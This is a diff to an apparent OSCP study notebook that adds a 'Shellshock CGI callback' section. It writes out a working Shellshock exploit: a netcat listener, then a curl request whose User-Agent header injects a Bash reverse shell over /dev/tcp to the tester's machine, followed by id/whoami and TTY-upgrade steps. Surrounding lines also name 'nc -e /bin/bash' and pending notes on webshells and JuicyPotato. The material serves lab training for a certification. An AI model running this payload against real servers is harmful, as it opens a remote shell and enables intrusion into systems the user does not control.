@@ -181,6 +181,39 @@ The traditional `-e` flag (`nc -e /bin/bash -lvp 4444`) spawns a process with nc
 
 ## **Outstanding**
 - [ ] CFM webshell tag syntax, JuicyPotato CLSID token impersonation. Add both as separate breakdown headings here, then link them from [[COMMAND APPENDIX/Shells & Payloads]] and [[DECISION TREE/Shells & Payloads (Decision Tree)]].
+## Shellshock CGI callback: why the request may not return
+
+**Full commands:**
+
+~~~bash
+nc -lvnp "$Lport"
+
+curl --max-time 10 -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
+  -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1"
+
+id
+
+whoami
+
+stty raw -echo
+
+fg
+~~~
+
+**Piece by piece:**
+
+- The listener waits on the Kali callback port. It must be started before the web request.
+- The User-Agent header reaches the CGI environment and appends an interactive Bash callback to the same script that already passed the identity proof.
+- The HTTP request can remain open or time out because the CGI process is now attached to the shell instead of returning a normal page.
+- id, whoami, and hostname identify the received session before local enumeration starts.
+- stty raw -echo and fg recover job control for a raw callback. The local terminal changes, so reset is the recovery command if the display becomes unusable.
+
+The /dev/tcp syntax requires Bash. If the harmless proof succeeds but the callback does not, compare LocalIP, listener state, callback port, egress, and header quoting in that order.
+
+**Seen in:** [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]].
+
+#### Tags: #Shellshock #CGI #ReverseShell #Bash #TTY #CommandBreakdowns
+
 ## External Resources
 
 - [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
